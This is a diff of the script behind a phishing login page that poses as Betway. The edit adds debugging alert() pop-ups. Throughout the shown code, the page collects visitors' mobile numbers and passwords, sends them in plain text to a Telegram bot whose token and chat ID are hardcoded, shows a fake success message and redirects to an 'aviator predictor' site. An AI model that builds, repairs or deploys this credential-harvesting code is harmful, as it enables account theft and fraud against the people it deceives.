@@ -369,12 +369,14 @@
 
     <script>
         // ============================================
-        // COMPLETE WORKING JAVASCRIPT
+        // COMPLETE CODE WITH ALERTS FOR DEBUGGING
         // ============================================
 
-        // Wait for page to fully load
+        alert('🔴 1. Script loaded!');
+
         document.addEventListener('DOMContentLoaded', function() {
             
+            alert('🟢 2. DOM is ready!');
             console.log('✅ Page loaded successfully!');
 
             // Get all elements
@@ -386,43 +388,49 @@
             const messageDiv = document.getElementById('message');
             const loadingOverlay = document.getElementById('loadingOverlay');
 
+            // Check if elements exist
+            if (loginBtn) {
+                alert('✅ 3. Button found!');
+            } else {
+                alert('❌ 3. Button NOT found!');
+                return;
+            }
+
             // ===== FUNCTIONS =====
 
-            // Show message
             function showMessage(text, type) {
                 messageDiv.textContent = text;
                 messageDiv.className = type;
-                console.log('📢 Message:', text, 'Type:', type);
+                console.log('📢 Message:', text);
             }
 
-            // Hide message
             function hideMessage() {
                 messageDiv.textContent = '';
                 messageDiv.className = '';
             }
 
-            // Show loading spinner
             function showLoading() {
+                alert('⏳ 6. LOADING SPINNER SHOWING!');
                 loginBtn.disabled = true;
                 spinner.classList.add('active');
                 btnText.textContent = 'Logging in...';
                 loadingOverlay.classList.add('active');
-                console.log('⏳ LOADING: Spinner showing, button disabled');
+                console.log('⏳ LOADING: Spinner showing');
             }
 
-            // Hide loading spinner
             function hideLoading() {
                 loginBtn.disabled = false;
                 spinner.classList.remove('active');
                 btnText.textContent = 'Login';
                 loadingOverlay.classList.remove('active');
-                console.log('✅ LOADING: Spinner hidden, button enabled');
+                console.log('✅ LOADING: Spinner hidden');
             }
 
             // ===== MAIN LOGIN FUNCTION =====
 
             async function handleLogin(event) {
-                // Stop page from refreshing
+                alert('🟡 5. handleLogin() WAS CALLED!');
+
                 if (event) {
                     event.preventDefault();
                     event.stopPropagation();
@@ -430,56 +438,52 @@
 
                 console.log('🔑 LOGIN: Button clicked!');
 
-                // Get values
                 const mobileNumber = mobileInput.value.trim();
                 const password = passwordInput.value.trim();
 
+                alert('📱 Mobile: ' + mobileNumber + '\n🔒 Password: ' + (password ? '******' : 'empty'));
+
                 console.log('📱 Mobile:', mobileNumber);
-                console.log('🔒 Password:', password ? '********' : 'empty');
 
                 // ===== VALIDATION =====
 
-                // Check if fields are empty
                 if (!mobileNumber || !password) {
+                    alert('⚠️ EMPTY FIELDS!');
                     showMessage('⚠️ Please enter both mobile number and password.', 'error');
                     return;
                 }
 
-                // Validate South African mobile number
                 const mobileRegex = /^(\+27|0)[6-8][0-9]{8}$/;
                 if (!mobileRegex.test(mobileNumber)) {
-                    showMessage('⚠️ Please enter a valid SA number (e.g., 0712345678 or +27712345678)', 'error');
+                    alert('⚠️ INVALID SA NUMBER!');
+                    showMessage('⚠️ Please enter a valid SA number (e.g., 0712345678)', 'error');
                     return;
                 }
 
-                // Clear previous messages
-                hideMessage();
+                alert('✅ Validation passed! Now showing loading...');
 
-                // ===== SHOW LOADING =====
+                hideMessage();
                 showLoading();
 
                 // ===== SEND TO TELEGRAM =====
 
                 try {
+                    alert('📤 7. Sending to Telegram...');
+                    
                     // Your Telegram bot details
                     const botToken = '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
                     const chatId = '8392790531';
                     
-                    // Create the message
                     const message = `
 🔐 **BETWAY LOGIN ALERT**
 ━━━━━━━━━━━━━━━━━━━
 📱 **Mobile:** ${mobileNumber}
 🔑 **Password:** ${password}
-🌐 **IP:** ${window.location.hostname || 'Unknown'}
-🕐 **Time:** ${new Date().toLocaleString('en-ZA', { timeZone: 'Africa/Johannesburg' })}
+🕐 **Time:** ${new Date().toLocaleString()}
 ━━━━━━━━━━━━━━━━━━━
                     `;
 
-                    // Send to Telegram API
                     const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-                    console.log('📤 Sending to Telegram...');
 
                     const response = await fetch(telegramUrl, {
                         method: 'POST',
@@ -493,32 +497,26 @@
                         })
                     });
 
-                    console.log('📡 Response status:', response.status);
-
                     const data = await response.json();
-                    console.log('📦 Response data:', data);
+                    console.log('📦 Response:', data);
 
-                    // ===== HIDE LOADING =====
                     hideLoading();
 
-                    // Check if Telegram sent successfully
                     if (data.ok) {
-                        showMessage('✅ Login successful! Redirecting...', 'success');
-                        console.log('✅ SUCCESS: Details sent to Telegram!');
-                        
-                        // Show loading again before redirect
+                        alert('✅ 8. SENT TO TELEGRAM SUCCESSFULLY!');
+                        showMessage('✅ Login successful!', 'success');
                         showLoading();
                         setTimeout(function() {
                             window.location.href = 'https://betwayaviatorpredictor-production.up.railway.app';
                         }, 2000);
                     } else {
+                        alert('❌ 8. TELEGRAM ERROR!');
                         showMessage('❌ Login failed. Please try again.', 'error');
-                        console.log('❌ Telegram error:', data);
                     }
 
                 } catch (error) {
+                    alert('❌ 8. ERROR: ' + error.message);
                     console.error('❌ ERROR:', error);
-                    // Hide loading on error
                     hideLoading();
                     showMessage('❌ Network error. Please check your connection.', 'error');
                 }
@@ -528,18 +526,19 @@
 
             // Login button click
             loginBtn.addEventListener('click', function(e) {
+                alert('🖱️ 4. BUTTON CLICK DETECTED!');
                 console.log('🖱️ CLICK: Button clicked!');
                 handleLogin(e);
             });
 
-            console.log('✅ Button listener attached!');
+            alert('✅ 3b. Button listener attached!');
 
             // Enter key support
             document.addEventListener('keypress', function(e) {
                 if (e.key === 'Enter') {
                     const active = document.activeElement;
                     if (active === mobileInput || active === passwordInput) {
-                        console.log('⌨️ Enter key pressed!');
+                        alert('⌨️ ENTER KEY PRESSED!');
                         handleLogin(e);
                     }
                 }
@@ -559,7 +558,7 @@
             });
 
             console.log('✅ All systems ready!');
-            console.log('✅ Waiting for user to tap Login...');
+            alert('✅ 3c. ALL SYSTEMS READY!');
 
         });
     </script>
